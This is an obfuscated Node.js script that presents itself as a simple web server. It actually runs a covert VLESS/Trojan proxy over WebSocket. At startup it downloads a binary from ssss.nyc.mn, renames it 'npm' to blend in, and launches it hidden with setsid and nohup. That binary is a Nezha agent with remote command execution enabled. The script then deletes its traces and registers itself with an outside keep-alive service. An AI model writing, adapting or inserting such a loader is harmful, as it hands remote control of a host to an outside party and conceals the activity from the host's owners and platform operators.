const _0x24c5ef=_0x62ff;function _0x4c87(){const _0x3a1d2e=['client_secret:\x20','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','@cdns.doon.eu.org:443?security=tls&sni=','slice','16fXLcuS','path','error:\x20','pipe','NEZHA_PORT','pop','catch','net','country','log','utf8','PORT','woshinidie','update','http','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','6828DsShqN','end','7024lPBxkL','@cdns.doon.eu.org:443?encryption=none&security=tls&sni=','Server\x20is\x20running\x20on\x20port\x20','false','8443','Not\x20Found\x0a','DOMAIN','NAME','/bin/bash','setsid\x20nohup\x20./npm\x20-s\x20','https://arm64.ssss.nyc.mn/v1','index.html','chmod\x20+x\x20npm','19605NGhrBU','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','digest','createHash','write','2087','1463157DusYET','https://amd64.ssss.nyc.mn/v1','decode','error','77wypRKP','hex','NEZHA_KEY','1234.abc.com','config.yaml','https://speed.cloudflare.com/meta','map','replace','test','npm\x20running\x20error:','npm\x20is\x20already\x20running,\x20skip\x20running...','connect','Failed\x20to\x20resolve\x20','connection','Server','readUInt8','text/plain','readUInt16BE','axios','buffer','data','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','toString','aarch64','&fp=chrome&type=ws&host=','npm','2053','find','SUB_PATH','post','1456obhcMD','every','length','851315fsQodU','concat','arm64','https://dns.google/resolve?name=','finish','writeHead','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','message','8.8.4.4','readFile','Status','stream','46870IQomDp','base64','Hello\x20world!','includes','createServer','then','env','text/html','--tls','writeFileSync','1189662XZUJYq','npm\x20is\x20running','true','sha224','utf-8','AUTO_ACCESS','send','reduce','createWriteStream','arch','2083','substr','443','\x20with\x20all\x20DNS\x20servers','&path=%2F','get','from','split','close','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','type','https://arm64.ssss.nyc.mn/agent','Automatic\x20Access\x20Task\x20added\x20successfully','Answer','url','child_process','crypto','join','https://','Unknown','8MhkBdd'];_0x4c87=function(){return _0x3a1d2e;};return _0x4c87();}(function(_0x4a5afb,_0xb1f507){const _0x4dfe5f=_0x62ff,_0x3cc50c=_0x4a5afb();while(!![]){try{const _0x36c34c=parseInt(_0x4dfe5f(0x238))/0x1*(parseInt(_0x4dfe5f(0x218))/0x2)+parseInt(_0x4dfe5f(0x229))/0x3*(parseInt(_0x4dfe5f(0x213))/0x4)+-parseInt(_0x4dfe5f(0x1df))/0x5+-parseInt(_0x4dfe5f(0x1f5))/0x6+parseInt(_0x4dfe5f(0x1dc))/0x7*(parseInt(_0x4dfe5f(0x22b))/0x8)+parseInt(_0x4dfe5f(0x1ba))/0x9+-parseInt(_0x4dfe5f(0x1eb))/0xa*(parseInt(_0x4dfe5f(0x1be))/0xb);if(_0x36c34c===_0xb1f507)break;else _0x3cc50c['push'](_0x3cc50c['shift']());}catch(_0xbaa355){_0x3cc50c['push'](_0x3cc50c['shift']());}}}(_0x4c87,0x19b18));const os=require('os'),http=require(_0x24c5ef(0x226)),fs=require('fs'),axios=require(_0x24c5ef(0x1d0)),net=require(_0x24c5ef(0x21f)),path=require(_0x24c5ef(0x219)),crypto=require(_0x24c5ef(0x20f)),{Buffer}=require(_0x24c5ef(0x1d1)),{exec,execSync}=require(_0x24c5ef(0x20e)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x24c5ef(0x1f1)]['UUID']||'0f3a46b0-3db0-4ae1-a5bf-4df403391186',NEZHA_SERVER=process[_0x24c5ef(0x1f1)]['NEZHA_SERVER']||'',NEZHA_PORT=process[_0x24c5ef(0x1f1)][_0x24c5ef(0x21c)]||'',NEZHA_KEY=process[_0x24c5ef(0x1f1)][_0x24c5ef(0x1c0)]||'',DOMAIN=process[_0x24c5ef(0x1f1)][_0x24c5ef(0x231)]||_0x24c5ef(0x1c1),AUTO_ACCESS=process['env'][_0x24c5ef(0x1fa)]||![],WSPATH=process['env']['WSPATH']||UUID[_0x24c5ef(0x217)](0x0,0x8),SUB_PATH=process['env'][_0x24c5ef(0x1da)]||_0x24c5ef(0x224),NAME=process[_0x24c5ef(0x1f1)][_0x24c5ef(0x232)]||'',PORT=process[_0x24c5ef(0x1f1)][_0x24c5ef(0x223)]||0xbb8;let ISP='';const GetISP=async()=>{const _0x21dbc8=_0x24c5ef;try{const _0x4cef5d=await axios[_0x21dbc8(0x204)](_0x21dbc8(0x1c3)),_0x1d10cd=_0x4cef5d[_0x21dbc8(0x1d2)];ISP=(_0x1d10cd[_0x21dbc8(0x220)]+'-'+_0x1d10cd['asOrganization'])[_0x21dbc8(0x1c5)](/ /g,'_');}catch(_0x6eda56){ISP=_0x21dbc8(0x212);}};GetISP();const httpServer=http[_0x24c5ef(0x1ef)]((_0x44365d,_0x3396ea)=>{const _0xa57a9=_0x24c5ef;if(_0x44365d[_0xa57a9(0x20d)]==='/'){const _0x5fe0f9=path[_0xa57a9(0x210)](__dirname,_0xa57a9(0x236));fs[_0xa57a9(0x1e8)](_0x5fe0f9,_0xa57a9(0x222),(_0x5a40bd,_0xde5dd5)=>{const _0x111e58=_0xa57a9;if(_0x5a40bd){_0x3396ea['writeHead'](0xc8,{'Content-Type':_0x111e58(0x1f2)}),_0x3396ea['end'](_0x111e58(0x1ed));return;}_0x3396ea[_0x111e58(0x1e4)](0xc8,{'Content-Type':_0x111e58(0x1f2)}),_0x3396ea[_0x111e58(0x22a)](_0xde5dd5);});return;}else{if(_0x44365d[_0xa57a9(0x20d)]==='/'+SUB_PATH){const _0x536c33=NAME?NAME+'-'+ISP:ISP,_0x932250='vless://'+UUID+_0xa57a9(0x22c)+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+'&path=%2F'+WSPATH+'#'+_0x536c33,_0x290669='trojan://'+UUID+_0xa57a9(0x216)+DOMAIN+_0xa57a9(0x1d6)+DOMAIN+_0xa57a9(0x203)+WSPATH+'#'+_0x536c33,_0x2eea4e=_0x932250+'\x0a'+_0x290669,_0x25f7ac=Buffer[_0xa57a9(0x205)](_0x2eea4e)[_0xa57a9(0x1d4)](_0xa57a9(0x1ec));_0x3396ea['writeHead'](0xc8,{'Content-Type':'text/plain'}),_0x3396ea['end'](_0x25f7ac+'\x0a');}else _0x3396ea['writeHead'](0x194,{'Content-Type':_0xa57a9(0x1ce)}),_0x3396ea[_0xa57a9(0x22a)](_0xa57a9(0x230));}}),wss=new WebSocket[(_0x24c5ef(0x1cc))]({'server':httpServer}),uuid=UUID[_0x24c5ef(0x1c5)](/-/g,''),DNS_SERVERS=[_0x24c5ef(0x1e7),'1.1.1.1'];function resolveHost(_0x49919b){return new Promise((_0x36c5a4,_0x4b6312)=>{const _0x36dd52=_0x62ff;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x36dd52(0x1c6)](_0x49919b)){_0x36c5a4(_0x49919b);return;}let _0x478731=0x0;function _0x16c573(){const _0x41a17c=_0x36dd52;if(_0x478731>=DNS_SERVERS[_0x41a17c(0x1de)]){_0x4b6312(new Error(_0x41a17c(0x1ca)+_0x49919b+_0x41a17c(0x202)));return;}const _0x27d0d4=DNS_SERVERS[_0x478731];_0x478731++;const _0x247e0b=_0x41a17c(0x1e2)+encodeURIComponent(_0x49919b)+'&type=A';axios[_0x41a17c(0x204)](_0x247e0b,{'timeout':0x1388,'headers':{'Accept':'application/dns-json'}})['then'](_0x19bf01=>{const _0xa5ca07=_0x41a17c,_0x13514c=_0x19bf01['data'];if(_0x13514c[_0xa5ca07(0x1e9)]===0x0&&_0x13514c[_0xa5ca07(0x20c)]&&_0x13514c['Answer'][_0xa5ca07(0x1de)]>0x0){const _0x1658f5=_0x13514c['Answer'][_0xa5ca07(0x1d9)](_0x1da565=>_0x1da565[_0xa5ca07(0x209)]===0x1);if(_0x1658f5){_0x36c5a4(_0x1658f5[_0xa5ca07(0x1d2)]);return;}}_0x16c573();})[_0x41a17c(0x21e)](_0x2c2c0f=>{_0x16c573();});}_0x16c573();});}function handleVlessConnection(_0x4ea0de,_0x5c7ae6){const _0x368aea=_0x24c5ef,[_0x334097]=_0x5c7ae6,_0x458d92=_0x5c7ae6[_0x368aea(0x217)](0x1,0x11);if(!_0x458d92['every']((_0x39e6f7,_0x454333)=>_0x39e6f7==parseInt(uuid[_0x368aea(0x200)](_0x454333*0x2,0x2),0x10)))return![];let _0x1dd8b8=_0x5c7ae6['slice'](0x11,0x12)[_0x368aea(0x1cd)]()+0x13;const _0x1ba7a2=_0x5c7ae6[_0x368aea(0x217)](_0x1dd8b8,_0x1dd8b8+=0x2)[_0x368aea(0x1cf)](0x0),_0x6e43d4=_0x5c7ae6[_0x368aea(0x217)](_0x1dd8b8,_0x1dd8b8+=0x1)[_0x368aea(0x1cd)](),_0x102553=_0x6e43d4==0x1?_0x5c7ae6['slice'](_0x1dd8b8,_0x1dd8b8+=0x4)[_0x368aea(0x210)]('.'):_0x6e43d4==0x2?new TextDecoder()[_0x368aea(0x1bc)](_0x5c7ae6['slice'](_0x1dd8b8+0x1,_0x1dd8b8+=0x1+_0x5c7ae6[_0x368aea(0x217)](_0x1dd8b8,_0x1dd8b8+0x1)['readUInt8']())):_0x6e43d4==0x3?_0x5c7ae6['slice'](_0x1dd8b8,_0x1dd8b8+=0x10)[_0x368aea(0x1fc)]((_0x2dab08,_0x47e776,_0x50e949,_0x4f7a24)=>_0x50e949%0x2?_0x2dab08[_0x368aea(0x1e0)](_0x4f7a24['slice'](_0x50e949-0x1,_0x50e949+0x1)):_0x2dab08,[])[_0x368aea(0x1c4)](_0x191a83=>_0x191a83[_0x368aea(0x1cf)](0x0)['toString'](0x10))[_0x368aea(0x210)](':'):'';_0x4ea0de[_0x368aea(0x1fb)](new Uint8Array([_0x334097,0x0]));const _0x12bba1=createWebSocketStream(_0x4ea0de);return resolveHost(_0x102553)[_0x368aea(0x1f0)](_0x479115=>{const _0x3ee385=_0x368aea;net['connect']({'host':_0x479115,'port':_0x1ba7a2},function(){const _0x1811bd=_0x62ff;this[_0x1811bd(0x1b8)](_0x5c7ae6['slice'](_0x1dd8b8)),_0x12bba1['on'](_0x1811bd(0x1bd),()=>{})[_0x1811bd(0x21b)](this)['on']('error',()=>{})[_0x1811bd(0x21b)](_0x12bba1);})['on'](_0x3ee385(0x1bd),()=>{});})[_0x368aea(0x21e)](_0x2c776d=>{const _0x226b22=_0x368aea;net[_0x226b22(0x1c9)]({'host':_0x102553,'port':_0x1ba7a2},function(){const _0x107467=_0x226b22;this[_0x107467(0x1b8)](_0x5c7ae6[_0x107467(0x217)](_0x1dd8b8)),_0x12bba1['on'](_0x107467(0x1bd),()=>{})[_0x107467(0x21b)](this)['on']('error',()=>{})[_0x107467(0x21b)](_0x12bba1);})['on']('error',()=>{});}),!![];}function handleTrojanConnection(_0x3a267a,_0x317c7d){const _0x5a1323=_0x24c5ef;try{if(_0x317c7d['length']<0x3a)return![];const _0x20e44f=_0x317c7d[_0x5a1323(0x217)](0x0,0x38)[_0x5a1323(0x1d4)](),_0x397530=[UUID];let _0x306794=null;for(const _0x4a1820 of _0x397530){const _0x198697=crypto[_0x5a1323(0x1b7)](_0x5a1323(0x1f8))[_0x5a1323(0x225)](_0x4a1820)[_0x5a1323(0x23a)](_0x5a1323(0x1bf));if(_0x198697===_0x20e44f){_0x306794=_0x4a1820;break;}}if(!_0x306794)return![];let _0x3c8d4d=0x38;_0x317c7d[_0x3c8d4d]===0xd&&_0x317c7d[_0x3c8d4d+0x1]===0xa&&(_0x3c8d4d+=0x2);const _0x1ebc7a=_0x317c7d[_0x3c8d4d];if(_0x1ebc7a!==0x1)return![];_0x3c8d4d+=0x1;const _0x28ca=_0x317c7d[_0x3c8d4d];_0x3c8d4d+=0x1;let _0x5d0f83,_0x488701;if(_0x28ca===0x1)_0x5d0f83=_0x317c7d['slice'](_0x3c8d4d,_0x3c8d4d+0x4)[_0x5a1323(0x210)]('.'),_0x3c8d4d+=0x4;else{if(_0x28ca===0x3){const _0x5044ce=_0x317c7d[_0x3c8d4d];_0x3c8d4d+=0x1,_0x5d0f83=_0x317c7d[_0x5a1323(0x217)](_0x3c8d4d,_0x3c8d4d+_0x5044ce)[_0x5a1323(0x1d4)](),_0x3c8d4d+=_0x5044ce;}else{if(_0x28ca===0x4)_0x5d0f83=_0x317c7d[_0x5a1323(0x217)](_0x3c8d4d,_0x3c8d4d+0x10)[_0x5a1323(0x1fc)]((_0x452393,_0x162f0e,_0x351caf,_0x35726e)=>_0x351caf%0x2?_0x452393[_0x5a1323(0x1e0)](_0x35726e[_0x5a1323(0x217)](_0x351caf-0x1,_0x351caf+0x1)):_0x452393,[])[_0x5a1323(0x1c4)](_0x5cf9ba=>_0x5cf9ba[_0x5a1323(0x1cf)](0x0)['toString'](0x10))[_0x5a1323(0x210)](':'),_0x3c8d4d+=0x10;else return![];}}_0x488701=_0x317c7d[_0x5a1323(0x1cf)](_0x3c8d4d),_0x3c8d4d+=0x2;_0x3c8d4d<_0x317c7d[_0x5a1323(0x1de)]&&_0x317c7d[_0x3c8d4d]===0xd&&_0x317c7d[_0x3c8d4d+0x1]===0xa&&(_0x3c8d4d+=0x2);const _0x59e21e=createWebSocketStream(_0x3a267a);return resolveHost(_0x5d0f83)[_0x5a1323(0x1f0)](_0x3b06c1=>{const _0x2fab29=_0x5a1323;net['connect']({'host':_0x3b06c1,'port':_0x488701},function(){const _0x2fc4be=_0x62ff;_0x3c8d4d<_0x317c7d[_0x2fc4be(0x1de)]&&this[_0x2fc4be(0x1b8)](_0x317c7d[_0x2fc4be(0x217)](_0x3c8d4d)),_0x59e21e['on'](_0x2fc4be(0x1bd),()=>{})[_0x2fc4be(0x21b)](this)['on'](_0x2fc4be(0x1bd),()=>{})['pipe'](_0x59e21e);})['on'](_0x2fab29(0x1bd),()=>{});})['catch'](_0x1a54b1=>{const _0x2557e5=_0x5a1323;net[_0x2557e5(0x1c9)]({'host':_0x5d0f83,'port':_0x488701},function(){const _0x52c896=_0x2557e5;_0x3c8d4d<_0x317c7d[_0x52c896(0x1de)]&&this['write'](_0x317c7d['slice'](_0x3c8d4d)),_0x59e21e['on'](_0x52c896(0x1bd),()=>{})[_0x52c896(0x21b)](this)['on'](_0x52c896(0x1bd),()=>{})[_0x52c896(0x21b)](_0x59e21e);})['on'](_0x2557e5(0x1bd),()=>{});}),!![];}catch(_0x18600a){return![];}}function _0x62ff(_0x49bfa7,_0x32bb78){_0x49bfa7=_0x49bfa7-0x1b7;const _0x4c87f6=_0x4c87();let _0x62ffbc=_0x4c87f6[_0x49bfa7];return _0x62ffbc;}wss['on'](_0x24c5ef(0x1cb),(_0x5f85c6,_0x5584a7)=>{const _0x57d523=_0x24c5ef,_0x9df7f1=_0x5584a7[_0x57d523(0x20d)]||'';_0x5f85c6['once'](_0x57d523(0x1e6),_0x55d7dc=>{const _0x5ea282=_0x57d523;if(_0x55d7dc[_0x5ea282(0x1de)]>0x11&&_0x55d7dc[0x0]===0x0){const _0x185c5a=_0x55d7dc[_0x5ea282(0x217)](0x1,0x11),_0x3c0f32=_0x185c5a[_0x5ea282(0x1dd)]((_0x7e4dd5,_0x537852)=>_0x7e4dd5==parseInt(uuid[_0x5ea282(0x200)](_0x537852*0x2,0x2),0x10));if(_0x3c0f32){!handleVlessConnection(_0x5f85c6,_0x55d7dc)&&_0x5f85c6[_0x5ea282(0x207)]();return;}}!handleTrojanConnection(_0x5f85c6,_0x55d7dc)&&_0x5f85c6[_0x5ea282(0x207)]();})['on']('error',()=>{});});const getDownloadUrl=()=>{const _0x3917ce=_0x24c5ef,_0x3c529d=os[_0x3917ce(0x1fe)]();return _0x3c529d==='arm'||_0x3c529d===_0x3917ce(0x1e1)||_0x3c529d===_0x3917ce(0x1d5)?!NEZHA_PORT?_0x3917ce(0x235):_0x3917ce(0x20a):!NEZHA_PORT?_0x3917ce(0x1bb):'https://amd64.ssss.nyc.mn/agent';},downloadFile=async()=>{const _0x5d9187=_0x24c5ef;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x23aa29=getDownloadUrl(),_0x41444e=await axios({'method':_0x5d9187(0x204),'url':_0x23aa29,'responseType':_0x5d9187(0x1ea)}),_0x3c3925=fs[_0x5d9187(0x1fd)](_0x5d9187(0x1d7));return _0x41444e[_0x5d9187(0x1d2)][_0x5d9187(0x21b)](_0x3c3925),new Promise((_0x5d1eb9,_0x2d6b4c)=>{const _0x38cbd6=_0x5d9187;_0x3c3925['on'](_0x38cbd6(0x1e3),()=>{const _0x817dcd=_0x38cbd6;console[_0x817dcd(0x221)]('npm\x20download\x20successfully'),exec(_0x817dcd(0x237),_0x75aa21=>{if(_0x75aa21)_0x2d6b4c(_0x75aa21);_0x5d1eb9();});}),_0x3c3925['on'](_0x38cbd6(0x1bd),_0x2d6b4c);});}catch(_0x4139f4){throw _0x4139f4;}},runnz=async()=>{const _0x4719c3=_0x24c5ef;try{const _0x2af286=execSync(_0x4719c3(0x215),{'encoding':_0x4719c3(0x1f9)});if(_0x2af286['trim']()!==''){console[_0x4719c3(0x221)](_0x4719c3(0x1c8));return;}}catch(_0x4f747c){}await downloadFile();let _0x77f73a='',_0x2f5987=[_0x4719c3(0x201),_0x4719c3(0x22f),'2096',_0x4719c3(0x1b9),_0x4719c3(0x1ff),_0x4719c3(0x1d8)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x3572ed=_0x2f5987[_0x4719c3(0x1ee)](NEZHA_PORT)?_0x4719c3(0x1f3):'';_0x77f73a=_0x4719c3(0x234)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x3572ed+_0x4719c3(0x1e5);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x4a4e36=NEZHA_SERVER[_0x4719c3(0x1ee)](':')?NEZHA_SERVER[_0x4719c3(0x206)](':')[_0x4719c3(0x21d)]():'',_0x2ee9c8=_0x2f5987['includes'](_0x4a4e36)?_0x4719c3(0x1f7):_0x4719c3(0x22e),_0xce028e=_0x4719c3(0x214)+NEZHA_KEY+_0x4719c3(0x239)+NEZHA_SERVER+_0x4719c3(0x227)+_0x2ee9c8+_0x4719c3(0x1d3)+UUID;fs[_0x4719c3(0x1f4)]('config.yaml',_0xce028e);}_0x77f73a=_0x4719c3(0x228);}else{console['log'](_0x4719c3(0x208));return;}}try{exec(_0x77f73a,{'shell':_0x4719c3(0x233)},_0x3c6908=>{const _0x1bfb20=_0x4719c3;if(_0x3c6908)console['error'](_0x1bfb20(0x1c7),_0x3c6908);else console[_0x1bfb20(0x221)](_0x1bfb20(0x1f6));});}catch(_0x5a842d){console['error'](_0x4719c3(0x21a)+_0x5a842d);}};async function addAccessTask(){const _0x3c27a3=_0x24c5ef;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x58a9a3=_0x3c27a3(0x211)+DOMAIN+'/'+SUB_PATH;try{const _0x41862d=await axios[_0x3c27a3(0x1db)]('https://oooo.serv00.net/add-url',{'url':_0x58a9a3},{'headers':{'Content-Type':'application/json'}});console['log'](_0x3c27a3(0x20b));}catch(_0x5bc52c){}}const delFiles=()=>{const _0xdb86a1=_0x24c5ef;fs['unlink'](_0xdb86a1(0x1d7),()=>{}),fs['unlink'](_0xdb86a1(0x1c2),()=>{});};httpServer['listen'](PORT,()=>{const _0x1b67ef=_0x24c5ef;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x1b67ef(0x221)](_0x1b67ef(0x22d)+PORT);});
